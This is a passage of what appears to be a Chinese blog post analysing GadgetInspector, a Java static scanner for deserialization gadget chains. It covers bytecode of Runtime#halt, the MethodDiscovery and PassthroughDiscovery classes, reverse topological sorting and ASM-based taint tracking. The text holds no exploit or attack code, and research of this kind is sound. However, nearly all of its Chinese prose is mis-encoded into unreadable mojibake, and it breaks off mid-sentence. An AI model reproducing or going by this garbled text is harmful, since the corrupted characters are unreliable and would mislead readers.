å¦‚ä½¿ç”¨jclasslibæŸ¥çœ‹java.lang.Runtime#haltæ–¹æ³•çš„æŒ‡ä»¤é›†</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//source</span><br>public void halt(<span class="hljs-built_in">int</span> status) &#123;<br>    SecurityManager sm = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">SecurityManager()</span>;<br>    <span class="hljs-keyword">if</span> (sm != null) &#123;<br>    sm.check<span class="hljs-constructor">Exit(<span class="hljs-params">status</span>)</span>;<br>    &#125;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Shutdown</span>.</span></span>before<span class="hljs-constructor">Halt()</span>;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Shutdown</span>.</span></span>halt(status);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹åº”çš„JVMæŒ‡ä»¤ï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle"> <span class="hljs-number">0</span> invokestatic #<span class="hljs-number">203</span> &lt;java<span class="hljs-regexp">/lang/</span>System.getSecurityManager : ()Ljava<span class="hljs-regexp">/lang/</span>SecurityManager;&gt;<br> <span class="hljs-number">3</span> astore_2<br> <span class="hljs-number">4</span> aload_2<br> <span class="hljs-number">5</span> ifnull <span class="hljs-number">13</span> (+<span class="hljs-number">8</span>)<br> <span class="hljs-number">8</span> aload_2<br> <span class="hljs-number">9</span> iload_1<br><span class="hljs-number">10</span> invokevirtual #<span class="hljs-number">191</span> &lt;java<span class="hljs-regexp">/lang/</span>SecurityManager.checkExit : (I)V&gt;<br><span class="hljs-number">13</span> invokestatic #<span class="hljs-number">194</span> &lt;java<span class="hljs-regexp">/lang/</span>Shutdown.beforeHalt : ()V&gt;<br><span class="hljs-number">16</span> iload_1<br><span class="hljs-number">17</span> invokestatic #<span class="hljs-number">196</span> &lt;java<span class="hljs-regexp">/lang/</span>Shutdown.halt : (I)V&gt;<br><span class="hljs-number">20</span> <span class="hljs-keyword">return</span><br><br></code></pre></td></tr></table></figure><p>æ–¹æ³•ä½“å†…æ¯è¡Œä»£ç çš„æ“ä½œæŒ‡ä»¤</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/5.png"></p><p>ç»“åˆä½¿ç”¨æ’ä»¶ASM Bytecode Viewerä¸­çš„ASMä»£ç ã€æ’ä»¶jclasslibç”Ÿæˆçš„JVMæŒ‡ä»¤å°±å¯ä»¥å¾ˆå¥½çš„è¾…åŠ©æˆ‘ä»¬ç†è§£GadgetInspectoræ˜¯å¦‚ä½•åˆ©ç”¨ASMè§‚å¯Ÿè€…æ¨¡å¼ã€JVMæŒ‡ä»¤æ“ä½œã€æ¨¡æ‹Ÿjava stackè¿›å‡ºè¿™äº›æŠ€æœ¯æœ€ç»ˆè¾¾åˆ°æŒ–æ˜åˆ©ç”¨é“¾çš„ç›®çš„çš„</p><h2 id="2ã€å…³é”®ç±»"><a href="#2ã€å…³é”®ç±»" class="headerlink" title="2ã€å…³é”®ç±»"></a>2ã€å…³é”®ç±»</h2><p>åœ¨æ•´ä¸ªé¡¹ç›®ä¸­æœ‰ä¸€äº›å…³é”®ç±»ï¼Œæ‰¿æ‹…äº†ä¿¡æ¯æ”¶é›†ã€æ–¹æ³•å†…æ±¡ç‚¹åˆ†æã€æ–¹æ³•é—´æ±¡ç‚¹ä¼ é€’ã€é€†æ‹“æ‰‘æ’åºã€JVM æŒ‡ä»¤æ¨¡æ‹Ÿã€sourceæ–¹æ³•æŸ¥æ‰¾ã€åˆ©ç”¨é“¾æ•´åˆç­‰ä»»åŠ¡ã€‚æˆ‘ä»¬æŒ‰ç…§æ‰«æé¡ºåºé‡ç‚¹åˆ†æä¸‹è¿™å‡ ä¸ªå…³é”®ç±»çš„ä»£ç </p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/6.png"></p><h3 id="2-1-MethodDiscovery-ç±»æ–¹æ³•ä¿¡æ¯æ”¶é›†"><a href="#2-1-MethodDiscovery-ç±»æ–¹æ³•ä¿¡æ¯æ”¶é›†" class="headerlink" title="2.1 MethodDiscovery ç±»æ–¹æ³•ä¿¡æ¯æ”¶é›†"></a>2.1 MethodDiscovery ç±»æ–¹æ³•ä¿¡æ¯æ”¶é›†</h3><p>MethodDiscoveryç±»ç”¨äºå‘ç°ç›®æ ‡classpathä¸­çš„çš„æ–¹æ³•ï¼Œä½†æ˜¯å®é™…æ‰«ææ—¶ä¼šæŠŠgadgetinspectoræœ¬èº«çš„ç±»ä¹Ÿæ”¶é›†è¿›å» å¹²æ‰°æˆ‘ä»¬çš„åˆ†æï¼Œæˆ‘åœ¨getAllClassesä¸­å¢åŠ äº†é€»è¾‘åˆ¤æ–­æ¥æ’é™¤gadgetinspectoræœ¬èº«çš„ç±»</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#ClassResourceEnumerator</span><span class="hljs-selector-id">#getAllClasses</span><br><span class="hljs-selector-tag">for</span>(ClassPath.ClassInfo <span class="hljs-attribute">classInfo </span>: ClassPath.<span class="hljs-built_in">from</span>(classLoader).<span class="hljs-built_in">getAllClasses</span>())&#123;<br>            <span class="hljs-selector-tag">if</span>((!classInfo.<span class="hljs-built_in">getName</span>().<span class="hljs-built_in">contains</span>(<span class="hljs-string">&quot;gadgetinspector&quot;</span>)))&#123;<br>                <span class="hljs-selector-tag">result</span><span class="hljs-selector-class">.add</span>(new <span class="hljs-built_in">ClassLoaderClassResource</span>(classLoader,classInfo.<span class="hljs-built_in">getResourceName</span>()));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/7.png"></p><p>ç”¨äºè§‚å¯Ÿçš„ASMç±»ä¸ºMethodDiscovery.MethodDiscoveryClassVisitorï¼Œå…¶ç»§æ‰¿ClassVisitorç±»ï¼šé‡å†™äº†visitFieldã€visitMethodæ–¹æ³•ï¼Œåœ¨è§‚å¯Ÿåˆ°ç›®æ ‡ç±»çš„å±æ€§ã€æ–¹æ³•æ—¶ï¼Œå°†å…¶æ·»åŠ åˆ°å¾…åˆ†æçš„members Listä¸discoveredMethods Listä¸­</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/8.png"></p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/9.png"></p><h3 id="2-2-PassthroughDiscovery-å•æ–¹æ³•çš„æ±¡ç‚¹åˆ†æ"><a href="#2-2-PassthroughDiscovery-å•æ–¹æ³•çš„æ±¡ç‚¹åˆ†æ" class="headerlink" title="2.2 PassthroughDiscovery  å•æ–¹æ³•çš„æ±¡ç‚¹åˆ†æ"></a>2.2 PassthroughDiscovery  å•æ–¹æ³•çš„æ±¡ç‚¹åˆ†æ</h3><p>PassthroughDiscoveryç±»æ˜¯é’ˆå¯¹å•ä¸ªæ–¹æ³•çš„å±€éƒ¨æ±¡ç‚¹åˆ†æï¼Œå¾—åˆ°å¯å½±å“(æ±¡æŸ“)è¿”å›å€¼çš„å‚æ•°ç´¢å¼•ï¼Œç”Ÿæˆpassthroughæ•°æ®æµã€‚å…±æœ‰ä¸‰æ­¥ï¼š1ã€åˆ†æè°ƒç”¨å…³ç³»ï¼Œå¾—åˆ°æ¯ä¸ªæ–¹æ³•è°ƒç”¨çš„æ–¹æ³•é›†åˆï¼›2ã€å¯¹æ‰€æœ‰æ–¹æ³•çš„è°ƒç”¨è¿›è¡Œé€†æ‹“æ‰‘æ’åºï¼›3ã€åˆ†ææ•°æ®æµä¼ é€’æƒ…å†µï¼Œç”ŸæˆpassthroughDataflowæ•°æ®æµ</p><p>PassthroughDiscovery#discover</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/10.png"></p><p>å¦‚ä¸‹æ˜¯åˆ†æFnEvalç±»çš„ç»“æœï¼Œorg.example.FnEval#invokeCallæ–¹æ³•å†…éƒ¨è°ƒç”¨äº†java.lang.Runtime#getRuntimeã€java.lang.Runtime#exec(java.lang.String)ä¸¤ä¸ªæ–¹æ³•</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/11.png"></p><h4 id="2-2-1-åˆ†ææ¯ä¸ªæ–¹æ³•çš„è°ƒç”¨å…³ç³»"><a href="#2-2-1-åˆ†ææ¯ä¸ªæ–¹æ³•çš„è°ƒç”¨å…³ç³»" class="headerlink" title="2.2.1 åˆ†ææ¯ä¸ªæ–¹æ³•çš„è°ƒç”¨å…³ç³»"></a>2.2.1 åˆ†ææ¯ä¸ªæ–¹æ³•çš„è°ƒç”¨å…³ç³»</h4><p>ç¬¬ä¸€æ­¥æ˜¯åˆ†æ2.1å¾—åˆ°çš„æ–¹æ³•é›†åˆï¼Œå°†æ¯ä¸ªæ–¹æ³•å†…éƒ¨è°ƒç”¨çš„æ–¹æ³•éƒ½å­˜å‚¨åˆ°methodCalls Mapä¸­ã€‚åˆ†æçš„æ ¸å¿ƒç±»æ˜¯MethodCallDiscoveryClassVisitorä¸MethodCallDiscoveryMethodVisitor</p><p>PassthroughDiscovery.MethodCallDiscoveryClassVisitor  ç»§æ‰¿è‡ªClassVisitorç±»ï¼šé‡å†™äº†visitMethodæ–¹æ³•ï¼Œæ–¹æ³•ä½“å†…ä½¿ç”¨MethodCallDiscoveryMethodVisitorè¿›è¡Œæ–¹æ³•çº§åˆ«çš„è§‚å¯Ÿåˆ†æ</p><p>PassthroughDiscovery.MethodCallDiscoveryMethodVisitor ç»§æ‰¿è‡ªMethodVisitorç±»ï¼šé‡å†™äº†visitMethodInsnæ–¹æ³•ï¼Œæ–¹æ³•ä½“å†…æ¯æ¬¡æ–¹æ³•è°ƒç”¨éƒ½ä¼šè§¦å‘è¯¥é‡å†™æ–¹æ³•ï¼Œç„¶åä¼šå°†è¢«è°ƒç”¨çš„æ–¹æ³•ä¿¡æ¯ï¼ˆæ‰€å±ç±»ä¿¡æ¯ã€æ–¹æ³•æè¿°ä¿¡æ¯ï¼‰æ·»åŠ åˆ°ç»“æœmethodCalls Mapä¸­</p><p>PassthroughDiscovery.MethodCallDiscoveryMethodVisitor#visitMethodInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/12.png"></p><h4 id="2-2-2-é€†æ‹“æ‰‘æ’åº"><a href="#2-2-2-é€†æ‹“æ‰‘æ’åº" class="headerlink" title="2.2.2 é€†æ‹“æ‰‘æ’åº"></a>2.2.2 é€†æ‹“æ‰‘æ’åº</h4><p>å°†2.2.1å¾—åˆ°çš„methodCalls Mapç»è¿‡é€†æ‹“æ‰‘æ’åºå¾—åˆ°sortedMethods Listï¼ŒPassthroughDiscovery#topologicallySortMethodCalls æ’åºæ–¹æ³•å¦‚ä¸‹</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/13.png"></p><p>æ’åºåˆ†æå‚è€ƒäº†Longofoå¸ˆå‚…çš„ <a href="https://paper.seebug.org/1034/#step3-passthrough">åˆ†æ</a>  PassthroughDiscovery#dfsTsort</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/14.png"></p><ul><li>dfsStackï¼šç”¨æ¥åˆ†ææ–¹æ³•è°ƒç”¨é¡ºåºï¼Œä¿è¯åœ¨é€†æ‹“æ‰‘æ—¶å€™ä¸å½¢æˆç¯</li><li>visitedNodesï¼šè®¿é—®è¿‡çš„ç»“ç‚¹ï¼Œåœ¨ä¸€æ¡è°ƒç”¨é“¾å‡ºç°é‡åˆçš„æ—¶å€™ï¼Œä¸ä¼šé€ æˆé‡å¤çš„æ’åº</li><li>sortedMethodsï¼šæœ€ç»ˆé€†æ‹“æ‰‘æ’åºå‡ºæ¥çš„ç»“æœ</li></ul><p>ä¸¾ä¾‹å¦‚ä¸‹å›¾ä¸ºæ–¹æ³•è°ƒç”¨æ ‘ï¼Œåˆå§‹æ–¹æ³•ä¸ºmed1ï¼Œæœ‰6æ¡æ–¹æ³•è°ƒç”¨é“¾</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/15.png"></p><p>æœ€ç»ˆç»è¿‡é€†æ‹“æ‰‘æ’åºåå¾—åˆ°çš„é¡ºåºæ˜¯ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">med7ã€med8ã€med3ã€med6ã€med2ã€med4ã€med1<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°åœ¨gadgetinspector.PassthroughDiscovery#dfsTsortçš„å¼€å¤´æœ‰è¿™æ ·ä¸¤è¡Œä»£ç </p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/16.png"></p><p>ç¬¬ä¸€ä¸ªifè¯­å¥ï¼ˆåœˆ1ï¼‰ç›®çš„æ˜¯å¤„ç†â€æ–¹æ³•äº’ç›¸è°ƒç”¨å½¢æˆç¯â€çš„é—®é¢˜ï¼Œå¦‚æœæ­£åœ¨åˆ†æçš„dfsStackä¸­åŒ…å«med1ï¼Œé‚£ä¹ˆå°±ä¸å¾€dfsStackä¸­å†æ·»åŠ äº†ã€‚ç¬¬äºŒä¸ªifè¯­å¥ï¼ˆåœˆ2ï¼‰æ˜¯å¤„ç†â€æ–¹æ³•é‡å¤è°ƒç”¨â€çš„é—®é¢˜ï¼Œå¦‚æœåœ¨åˆ†æmed1-&gt;med3è¿™æ¡é“¾æ—¶å‘ç°med3åœ¨med1-&gt;med2-med3é“¾ä¸­å·²è®¿é—®è¿‡ï¼Œé‚£ä¹ˆä¸å†ç»§ç»­è®¿é—®ã€‚ç­–ç•¥éå¸¸ç²—æš´ï¼Œå¯¹äºç¬¬ä¸€æ¬¡å·²æ’åºè¿‡çš„æ–¹æ³•ï¼Œç¬¬äºŒæ¬¡ç¢°åˆ°æ—¶ä¸å†åˆ†æã€‚è™½ç„¶é¿å…äº†é‡å¤æ‰«æè·Ÿç¯çš„é—®é¢˜ï¼Œä½†æ˜¯é€ æˆäº†ä¸¥é‡çš„æ¼æŠ¥ã€‚å¦‚æœmed1-&gt;med3-&gt;med7 åˆšå¥½å¯ä»¥èµ°é€šsourceåˆ°sinkï¼Œåˆ©ç”¨é“¾ä¹ŸçŸ­ï¼Œå·¥å…·ç”±äºç­–ç•¥é—®é¢˜åè€Œä¸ä¼šæ‰«åˆ°ã€‚æ‰€ä»¥è¿™ä¸€æ­¥éœ€è¦æ”¹è¿›ç­–ç•¥ä»¥å¹³è¡¡â€æœç´¢å¹¿åº¦ä¸æ·±åº¦ç­–ç•¥çš„å¹³è¡¡é—®é¢˜â€</p><p>å¦å¤–è¿™é‡Œä¸ºä»€ä¹ˆè¦ç”¨é€†æ‹“æ‰‘æ’åºDFSç®—æ³•ï¼Œè€Œä¸æ˜¯æ­£å‘æ‹“æ‰‘æ’åºBFSå‘¢ï¼Ÿè¿™ä¸ªæˆ‘ä»¬ä¸‹ä¸€ç« èŠ‚ä¼šç¢°åˆ°ï¼Œæ˜¯å› ä¸ºè¦ç¡®å®šçš„æ˜¯çˆ¶æ–¹æ³•çš„è¿”å›å€¼ä¸å“ªä¸ªå‚æ•°æœ‰å…³ï¼Œè€Œåœ¨æ–¹æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œè¿”å›å€¼ä¼šå—åˆ°å­æ–¹æ³•çš„å½±å“ï¼Œæ‰€ä»¥éœ€è¦å…ˆåˆ¤æ–­å­æ–¹æ³•çš„å‚æ•°ä¸è¿”å›å€¼çš„å…³è”å…³ç³»ï¼Œè¿›è€Œæ‰èƒ½å¾—å‡ºçˆ¶æ–¹æ³•çš„å‚æ•°æ±¡æŸ“æƒ…å†µã€‚æ‰€ä»¥è¿™é‡Œéœ€è¦ä½¿ç”¨é€†æ‹“æ‰‘æ’åºDFSç®—æ³•</p><h4 id="2-2-3-å•ä¸ªæ–¹æ³•æ±¡ç‚¹åˆ†æ"><a href="#2-2-3-å•ä¸ªæ–¹æ³•æ±¡ç‚¹åˆ†æ" class="headerlink" title="2.2.3 å•ä¸ªæ–¹æ³•æ±¡ç‚¹åˆ†æ"></a>2.2.3 å•ä¸ªæ–¹æ³•æ±¡ç‚¹åˆ†æ</h4><p>ä¾æ¬¡åˆ†æ2.2.2æ­¥å¾—åˆ°çš„sortedMethods Liståï¼Œå¯ä»¥å¾—å‡ºæ¯ä¸ªæ–¹æ³•çš„è¿”å›å€¼å—å“ªä¸ªå‚æ•°çš„å½±å“(ä¹Ÿå«æ±¡æŸ“)ã€‚è¿™ä¸€æ­¥æ˜¯ä¿¡æ¯æœé›†çš„é‡ç‚¹ï¼Œæœ‰äº†æ¯ä¸ªæ–¹æ³•çš„æ±¡æŸ“ç»“æœåå°±å¯ä»¥å¼€å§‹ä¸²è”æ–¹æ³•è¿›è¡Œåˆ†æ</p><p>PassthroughDiscovery.PassthroughDataflowClassVisitor  ç»§æ‰¿è‡ªClassVisitorç±»ï¼Œé‡äº†å†™visitMethodæ–¹æ³•ï¼šå¯¹ç›®æ ‡æ–¹æ³•ä½¿ç”¨PassthroughDataflowMethodVisitorè¿›è¡Œæ–¹æ³•çº§åˆ«çš„è§‚å¯Ÿåˆ†æ</p><p>PassthroughDiscovery.PassthroughDataflowMethodVisitorç»§æ‰¿è‡ªTaintTrackingMethodVisitorç±»ï¼›çˆ¶ç±»TaintTrackingMethodVisitor ç»§æ‰¿è‡ªMethodVisitorç±»</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/17.png"></p><p>TaintTrackingMethodVisitor#TaintTrackingMethodVisitor</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/18.png"></p><p>è¿™ä¸¤è€…æ˜¯çˆ¶å­ç±»å…³ç³»ï¼Œå­ç±»PassthroughDataflowMethodVisitorå®ç°äº†ï¼švisitCodeã€visitInsnã€visitFieldInsnã€visitMethodInsnç­‰æ–¹æ³•</p><p>çˆ¶ç±»å®ç°äº†ï¼švisitCodeã€visitFrameã€visitInsnã€visitIntInsnã€visitVarInsnã€visitTypeInsnã€visitFieldInsnã€visitMethodInsnã€visitInvokeDynamicInsnã€visitJumpInsnã€visitLabelã€visitLdcInsnã€visitIincInsnã€visitTableSwitchInsnã€visitLookupSwitchInsnã€visitMultiANewArrayInsnã€visitInsnAnnotationã€visitTryCatchBlockã€visitTryCatchAnnotationã€visitMaxsã€visitEndç­‰æ–¹æ³•ã€‚è¿™äº›æ˜¯ASMè§‚å¯Ÿç±»ç¢°åˆ°å„ç§JVMæŒ‡ä»¤æ—¶ä¼šè§¦å‘è°ƒç”¨çš„æ–¹æ³•</p><p>è¿™å¯¹çˆ¶å­ç±»æ˜¯åˆ†ææ•°æ®æµçš„æ ¸å¿ƒç±»ï¼Œå…¶ä½¿ç”¨JAVA ASMæŠ€æœ¯è§‚å¯Ÿæ–¹æ³•&#x2F;å±æ€§&#x2F;å˜é‡æ“ä½œ&#x2F;å­æ–¹æ³•è°ƒç”¨ã€æ¨¡æ‹ŸJVM Stackå…¥æ ˆå‡ºæ ˆæ“ä½œï¼Œç›¸å½“äºè®©é™æ€ä»£ç â€åŠ¨â€äº†èµ·æ¥ï¼Œåœ¨åŠ¨çš„è¿‡ç¨‹ä¸­å»è§‚å¯Ÿå‚æ•°çš„ä¼ é€’æ±¡æŸ“ã€æ–¹æ³•çš„è°ƒç”¨ï¼Œè¿›è€Œæ‰¾å‡ºå¯ä»¥ä»sourceé€šå¾€sinkä¹‹é—´çš„é“¾è·¯ã€‚gadgetinspectorå¼€å‘è€…åœ¨TaintTrackingMethodVisitor.SavedVariableStateç±»ä¸­åˆ›å»ºäº†localVarsã€stackVarsç”¨æ¥å¯¹æ ‡æœ¬åœ°å˜é‡è¡¨Local Variable TableåŠæ“ä½œæ•°æ ˆ Operand Stackï¼Œåœ¨åŒç±»ä¸‹åˆ©ç”¨ASMæŠ€æœ¯ä¸­visitXXXç­‰è§‚å¯Ÿæ–¹æ³•æ¨¡æ‹Ÿäº†JVMæŒ‡ä»¤é›†è°ƒç”¨push()ã€pop()å¯¹å˜é‡è¡¨åŠæ“ä½œæ ˆçš„è¿›å‡ºæ“ä½œ</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/19.png"></p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/20.png"></p><p>æ¥ç€åˆ†æçˆ¶å­ç±»å®ç°çš„å‡ ä¸ªå…³é”®æ–¹æ³•ï¼š</p><p>1ã€visitCodeï¼šè§‚å¯Ÿæ–¹æ³•æ—¶ï¼Œé¦–å…ˆä¼šå…ˆè§¦å‘visitCodeï¼Œå­ç±»å°† [[å¯¹è±¡å®ä¾‹],arg1,arg2]æŒ‰ç…§å…ˆåé¡ºåºæ·»åŠ åˆ°æœ¬åœ°å˜é‡è¡¨localVarsä¸­ï¼Œç”¨äºåç»­å‡ºæ ˆå…¥æ ˆçš„æ•°æ®æ¥æºã€‚è€Œçˆ¶ç±»ä½œç”¨æ˜¯åˆå§‹åŒ–äº†æœ¬åœ°å˜é‡è¡¨localVarsã€æ“ä½œæ•°æ ˆstackVars</p><p>PassthroughDiscovery.PassthroughDataflowMethodVisitor#visitCode</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/21.png"></p><p>TaintTrackingMethodVisitor#visitCode ç”¨äºæ¸…ç©ºæœ¬åœ°å˜é‡è¡¨ä¸æ“ä½œæ•°æ ˆåŠå ä½</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/22.png"></p><p>2ã€visitInsnï¼šè§‚å¯Ÿæ–¹æ³•æ—¶ï¼Œç¢°åˆ°æ— æ“ä½œæ•°æŒ‡ä»¤æ—¶ä¼šè§¦å‘visitInsn ï¼Œå­ç±»PassthroughDataflowMethodVisitorä¸»è¦å¤„ç†ç¢°åˆ°returnæŒ‡ä»¤é›†æ—¶çš„å‚æ•°æ±¡æŸ“æƒ…å†µï¼Œçˆ¶ç±»ä½œç”¨æ˜¯æ¨¡æ‹Ÿæ— æ“ä½œæ•°æŒ‡ä»¤é›†å¯¹åº”çš„å‡ºæ ˆå…¥æ ˆæ“ä½œï¼Œå¦‚[type]CONST_[n]æ¨é€æ•°æ®åˆ°æ ˆé¡¶ã€[type]ASTOREæ•°ç»„å‡ºæ ˆåˆ°è¡¨ã€[type]ALOADæ•°ç»„å‡ºè¡¨å…¥æ ˆç­‰ç­‰</p><p>PassthroughDataflowMethodVisitor#visitInsnæ˜¯æ“ä½œä¸­çš„é‡ç‚¹ï¼Œä¼šå°†æ ˆé¡¶æ•°æ®æ·»åŠ åˆ°æ±¡ç‚¹ç»“æœé›†åˆreturnTaintï¼Œæ­¤æ—¶æ ˆé¡¶å…ƒç´ å¯èƒ½ä¸ºï¼š1ã€å¯¹è±¡å®ä¾‹&#x2F;å®ä¾‹å±æ€§ï¼›2ã€è¢«è°ƒç”¨æ–¹æ³•çš„è¿”å›å€¼ã€‚ASMåœ¨ç¢°åˆ°è¿™ä¸¤è€…æ—¶ä¼šè°ƒç”¨visitFieldInsnã€visitMethodInsnè¿›è¡Œè§‚å¯Ÿï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•å‡ä¼šå°†æ±¡ç‚¹å‚æ•°ç´¢å¼•æ·»åŠ è‡³æ ˆé¡¶</p><p>PassthroughDiscovery.PassthroughDataflowMethodVisitor#visitInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/23.png"></p><p>TaintTrackingMethodVisitor#visitInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/24.png"></p><p>3ã€visitFieldInsnï¼šè§‚å¯Ÿæ–¹æ³•æ—¶ï¼Œæ¯æ¬¡å¯¹å±æ€§å­—æ®µçš„æ“ä½œéƒ½ä¼šè§¦å‘visitFieldInsnï¼Œå­ç±»PassthroughDataflowMethodVisitorä¸»è¦å¤„ç†GETFIELDæŒ‡ä»¤ï¼šå¯¹æ–¹æ³•æ‰€å±ç±»ä½¿ç”¨å†³ç­–å™¨serializableDecideråˆ¤æ–­ã€å¯¹å±æ€§åˆ¤æ–­æ˜¯å¦è¢«transientä¿®é¥°ã€‚æ‰€å±ç±»é€šè¿‡å†³ç­–å™¨ä¸”å±æ€§ä¸è¢«transientä¿®é¥°å°±é€šè¿‡å†³ç­–ã€‚çˆ¶ç±»æ¨¡æ‹Ÿäº† è·å–é™æ€å±æ€§å€¼GETSTATICã€è®¾ç½®é™æ€å±æ€§å€¼PUTSTATICã€è·å–éé™æ€å±æ€§å€¼GETFIELDã€è®¾ç½®éé™æ€å±æ€§å€¼PUTFIELD4ä¸ªJVMæŒ‡ä»¤çš„å‡ºæ ˆå…¥æ ˆæ“ä½œ</p><p>PassthroughDiscovery.PassthroughDataflowMethodVisitor#visitFieldInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/25.png"></p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/26.png"></p><p>TaintTrackingMethodVisitor#visitFieldInsn</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/27.png"></p><p>4ã€visitMethodInsnï¼šè§‚å¯Ÿæ–¹æ³•æ—¶ï¼Œæ–¹æ³•ä½“å†…æ¯æ¬¡è°ƒç”¨å…¶å®ƒæ–¹æ³•æ—¶éƒ½ä¼šè§¦å‘visitMethodInsnã€‚å­ç±»ä¸»è¦å¤„ç† initåˆå§‹åŒ–æ–¹æ³•æ±¡æŸ“æƒ…å†µã€è°ƒç”¨ç›®æ ‡æ–¹æ³•çš„æ±¡æŸ“æƒ…å†µã€‚çˆ¶ç±»ä¸»è¦å¤„ç†initåˆå§‹åŒ–æ–¹æ³•ã€ç™½åå•ã€è°ƒç”¨ç›®æ ‡æ–¹æ³•çš„æ±¡æŸ“æƒ…å†µã€Collection&#x2F;Mapå­ç±»çš„æ–¹æ³•å‚æ•°çš„æ±¡æŸ“æƒ…å†µã€‚è°ƒç”¨æ–¹æ³•åˆ†ä¸ºè°ƒç”¨é™æ€æ–¹æ³•ã€å®ä¾‹æ–¹æ³•ã€è¶…ç±»æ„é€ æ–¹æ³•ã€æ¥å£æ–¹æ³•ï¼Œè°ƒç”¨æ–¹æ³•æ‰€å±ç±»ä¸ºå¼•ç”¨ç±»å‹æ—¶ä¼šè°ƒç”¨INVOKEVIRTUALæŒ‡ä»¤ã€ä¸ºæ¥å£æ—¶è°ƒç”¨INVOKEINTERFACEæŒ‡ä»¤</p><p>visitMethodInsnå…ˆå°†å®ä¾‹ã€å…¥å‚æŒ¨ä¸ªæ·»åŠ åˆ°argTypesæ•°ç»„</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/28.png"></p><p>å‡å®šè¢«è°ƒç”¨æ–¹æ³•æœ‰Objectã€String 2ä¸ªå…¥å‚ï¼Œé‚£ä¹ˆargTypesä¸ºthisã€Objectã€Stringã€‚æ¥ç€å°†è°ƒç”¨ç›®æ ‡æ–¹æ³•å‰æ”¾åˆ°æ ˆä¸­çš„å‚æ•°(å³argTypes)ï¼Œéƒ½å¤åˆ¶ä¸€ä»½åˆ°argTaintã€‚å¦‚æœè¢«è°ƒç”¨æ–¹æ³•æ˜¯initæ–¹æ³•ï¼Œé‚£ä¹ˆthiså®ä¾‹ï¼ˆç´¢å¼•ä¸º0ï¼‰æ˜¯å¯ä»¥è¿›è¡Œæ±¡æŸ“ä¼ é€’çš„</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/29.png"></p><p>ç”±äºæ–¹æ³•è°ƒç”¨é¡ºåºç»è¿‡é€†æ‹“æ‰‘æ’åºï¼Œæ‰€ä»¥åœ¨åˆ†ææ—¶å…¶æ–¹æ³•ä½“å†…è°ƒç”¨çš„å­æ–¹æ³•ä¸€å®šå·²ç»è¢«åˆ†æè¿‡ã€‚è¿™ä¸€æ­¥ä¼šåˆ†æè°ƒç”¨æ–¹æ³•çš„è¿”å›å€¼æ˜¯å¦ä¼šæ”¶åˆ°è¢«è°ƒç”¨æ–¹æ³•å‚æ•°çš„å½±å“ï¼Œå¦‚æœå½±å“ï¼Œé‚£ä¹ˆæ·»åŠ åˆ°æ±¡ç‚¹é›†åˆreturnTaint</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/30.png"></p><p>å­ç±»åˆ¤æ–­ä¹‹åï¼Œå…ˆå°†æ±¡ç‚¹å‚æ•°ç´¢å¼•æ”¾åˆ°resultTaintï¼Œç„¶åè°ƒç”¨çˆ¶ç±»ç»§ç»­å¤„ç†initæ–¹æ³•ã€ObjectInputStream#defaultReadObjectã€ç™½åå•æ–¹æ³•ã€Map&#x2F;Collectionå­ç±»æ–¹æ³•ã€è¢«è°ƒç”¨æ–¹æ³•çš„æ±¡æŸ“ä¼ 